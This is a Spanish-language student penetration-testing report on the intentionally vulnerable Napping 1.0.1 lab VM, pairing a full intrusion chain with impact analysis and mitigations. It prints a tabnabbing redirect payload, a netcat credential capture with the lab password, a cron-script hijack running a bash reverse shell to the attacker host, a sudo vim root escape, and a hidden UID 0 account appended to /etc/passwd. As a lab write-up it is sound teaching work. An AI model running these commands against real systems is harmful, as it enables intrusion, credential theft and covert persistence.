ACTIVIDAD 11: PENTESTING DE NAPPING 1.0.1

Análisis forense y simulación de ataque avanzado (Tabnabbing, movimiento lateral cron query.py y escalada Vim root).

ACTIVIDAD 11

INFORME FORENSE Y DE RED TEAM: PENTESTING DE NAPPING VM

Alumno: Alonso Castillo Omar Karim (179033)


Materia: CNO V – Seguridad Informática

Universidad Politécnica de San Luis Potosí

1. Resumen Ejecutivo (Executive Summary)

El presente documento técnico detalla los resultados, procedimientos y evidencias de la auditoría de seguridad y pruebas de penetración avanzada realizadas sobre la máquina virtual vulnerable **Napping 1.0.1**. La evaluación simuló un escenario de adversario persistente externo sin credenciales previas en una red local controlada con dirección IP **192.168.56.103**.

Durante el engagement se identificó y explotó con éxito una brecha de **Tabnabbing (Tab Hijacking)** en la capa web, lo que permitió capturar credenciales de acceso administrativo del usuario `daniel`. Posteriormente, mediante la edición de un script cron automatizado con permisos mal asignados, se realizó un **movimiento lateral** al usuario `adrian`. Finalmente, abusando de privilegios delegados sin clave (`NOPASSWD`) en el editor `vim` bajo `sudoers`, se obtuvo **acceso total de superusuario (root)** en el servidor y se inyectó una cuenta administrativa oculta para persistencia.

2. Alcance (Scope) y Metodología

El alcance de la presente evaluación técnica e independiente se limitó de forma estricta al host local vulnerable `Napping` con dirección IP **192.168.56.103** en un entorno de red *Host-Only* en VirtualBox. La metodología aplicada se fundamentó de forma robusta bajo los estándares de la **OWASP Web Security Testing Guide (WSTG)** y el **PTES (Penetration Testing Execution Standard)**, recorriendo las fases secuenciales de Descubrimiento/ARP, Enumeración profunda de servicios, Explotación web, Movimiento lateral local, Escalada de privilegios y Análisis CIA.

3. El Vector de Explotación: Ataque de Tabnabbing

El punto de apoyo inicial en el servidor se obtuvo explotando una vulnerabilidad de **Tabnabbing (secuestro de pestañas)** en el formulario de envío de enlaces ubicado en `welcome.php`. Esta técnica aprovecha una mala configuración que no sanitiza la relación de pestañas del navegador, permitiendo al objeto `window.opener` manipular la página origen de la víctima.

Flujo del Ataque de Tabnabbing

1. Administrador Víctima autenticada en welcome.php que abre enlace sospechoso enviado.
2. Payload HTML payload.html se ejecuta en segundo plano redirigiendo la pestaña origen.
3. Fake Login La pestaña original carga un home.html falso que roba la clave.
4. Atacante Netcat en puerto 8000 recibe las credenciales en texto plano POST.

Script inyectado en el Payload (payload.html):

<script> window.opener.parent.location.replace('http://192.168.56.101:8000/home.html'); </script>

Una vez enviado este enlace al formulario, el administrador simulado interactuó con él. Su pestaña original fue redirigida a nuestro formulario de login falso, ingresando sus credenciales e interceptándose el tráfico POST en nuestro listener Netcat local, fugando la contraseña del usuario `daniel`:

nc -lvnp 8000 ==> Connection Received! Intercepted POST: ==> username: daniel ==> password: C@ughtm3napping123

4. Línea de Tiempo Forense del Ataque y Escalada

A continuación se describe la bitácora técnica de la intrusión y los movimientos realizados localmente por el atacante hasta alcanzar privilegios root:

  • 01

    Acceso Inicial por SSH

    Usando las credenciales de `daniel` interceptadas en el Tabnabbing, se logró establecer una shell interactiva remota limpia por SSH:

    ssh daniel@192.168.56.103 ==> login successful (Access as standard user 'daniel')
  • 02

    Enumeración y Movimiento Lateral (adrian)

    Se exploró el sistema de archivos local. Bajo el directorio `/home/adrian` se ubicó el script `query.py` ejecutado de manera automatizada como un **cron job** bajo el usuario `adrian`. Se descubrió que el script tenía permisos de escritura abiertos para el grupo `administrators`, al cual pertenece `daniel`:

    ls -la /home/adrian/query.py ==> -rw-rw-r-- 1 adrian administrators 104 query.py (Writable!)
  • 03

    Secuestro de Script y Reverse Shell

    Se editó `query.py` para inyectar una llamada al sistema que ejecute un archivo de shell inversa en Bash ubicado en `/dev/shm` (memoria temporal compartida), configurando un listener de Netcat a la escucha para recibir la shell:

    # Edición de query.py import os os.system('/usr/bin/bash /dev/shm/connection.sh') # Contenido de /dev/shm/connection.sh #!/bin/bash bash -c 'bash -i >& /dev/tcp/192.168.56.101/8000 0>&1' # Listener Atacante: nc -lvnp 8000 ==> Connection received! Shell established as 'adrian'
  • 04

    Estabilización de Consola (TTY)

    Una vez recibida la shell inversa de `adrian`, se procedió a estabilizar la consola utilizando el intérprete de Python para interactuar de forma segura:

    python3 -c 'import pty; pty.spawn("/bin/bash")' Ctrl + Z (Suspender) stty raw -echo; fg ==> Stable interactve TTY console active.

  • Escalada de Privilegios a Root (Bypass de Vim en Sudoers)

    Se auditó el perfil del usuario `adrian` ejecutando `sudo -l`. Se descubrió una regla crítica en la directiva de `sudoers` que le permitía ejecutar el editor `/usr/bin/vim` como root sin requerir contraseña (`NOPASSWD`). Usando la técnica documentada en **GTFOBins**, se escapó del editor para abrir una consola como root:

    adrian@napping:~$ sudo -l ==> (root) NOPASSWD: /usr/bin/vim # Explotación de Vim sudo /usr/bin/vim -c ':!/bin/sh' whoami ==> root (¡Acceso root total establecido!)
  • 06

    Establecimiento de Persistencia Administrativa

    Para garantizar el acceso persistente ante un eventual cambio de claves o reinicio, se añadió un usuario administrativo oculto con UID/GID 0 en `/etc/passwd` denominado `Equipo4`:

    echo "Equipo4:\$1\$6jZ...:0:0:root:/root:/bin/bash" >> /etc/passwd cat /etc/passwd | grep Equipo4 ==> Persistence validated!

5. Análisis de Impacto (Modelo CIA)

El compromiso absoluto de la máquina virtual Napping por el atacante se estructura bajo los pilares fundamentales del modelo CIA:

Confidencialidad

Crítico

Exposición total del sistema de archivos. Se comprobó la presencia de credenciales de bases de datos hardcodeadas en texto plano en scripts administrativos del sistema (como en el archivo `del_users.py` que exponía usuario "adrian" y contraseña de base de datos), permitiendo el robo masivo de información.

Integridad

Crítico

Capacidad de alteración lógica completa. El atacante modificó query.py e inyectó un usuario root permanente en `/etc/passwd`. Un actor hostil tiene privilegios para borrar bitácoras de logs, reescribir la web y alterar la veracidad de los datos transaccionales del negocio.

Disponibilidad

Crítico

El control del usuario root permite apagar los servidores web, inhabilitar servicios o detonar la instrucción destructiva TRUNCATE TABLE detectada en scripts del servidor, causando una interrupción total instantánea y daños catastróficos a las bases de datos de la empresa.

6. Inventario de Hallazgos y Vulnerabilidades

A continuación se detallan de forma estructurada los cuatro hallazgos técnicos reportados en la auditoría, ordenados por nivel de severidad:

ID Vulnerabilidad Detectada Severidad Evidencia Técnica en Campo Recomendación de Mitigación
VULN-01 Tabnabbing (Tab Hijacking) en formulario welcome.php Alta Explotación exitosa inyectando un payload HTML que manipula `window.opener.parent.location` para redirigir la sesión del admin. Implementar en todos los enlaces salientes la directiva de seguridad `rel="noopener noreferrer"`. Sanitizar estrictamente el formulario de enlaces.
VULN-02 Asignación de permisos de escritura inseguros en script cron query.py Alta Permiso de escritura (-rw-rw-r--) concedido al grupo administrators en un script cron ejecutado por el usuario `adrian`. Auditar y aplicar el principio de mínimo privilegio en el filesystem. Los scripts programados automáticos solo deben pertenecer y ser editables por su autor.
VULN-03 Directiva NOPASSWD en sudoers para herramienta interactiva Vim Crítica Bypass exitoso y escalada vertical a root ejecutando el escape documentado en GTFOBins `sudo vim -c ':!/bin/sh'`. Suprimir privilegios NOPASSWD en el archivo `/etc/sudoers` para editores de texto interactivos que permitan escapar a shell.
VULN-04 Credenciales de bases de datos hardcodeadas en texto plano en del_users.py Media Archivo visible de administración exponiendo en claro las variables de conexión a base de datos (user y password). Migrar la gestión de contraseñas de conexión a variables de entorno cifradas o sistemas de bóvedas de claves (Key Vaults).

7. Conclusión

El análisis de intrusión de **Napping 1.0.1** corrobora la enorme importancia de endurecer la configuración local de los servidores (*hardening*). Una falla inicial en la sanitización web de enlaces (Tabnabbing) actuó como la llave de entrada, pero fueron las **malas configuraciones locales** (permisos laxos de escritura de scripts grupales y privilegios NOPASSWD sobre Vim en sudoers) las que facilitaron al atacante desplazarse lateralmente y elevar privilegios de forma simple y catastrófica hasta el nivel de superusuario.

La implementación rápida de mitigaciones sencillas (parámetro noopener, saneamiento de sudoers y uso de bóvedas de contraseñas) neutralizará de forma contundente la totalidad del árbol de ataque expuesto en este informe.
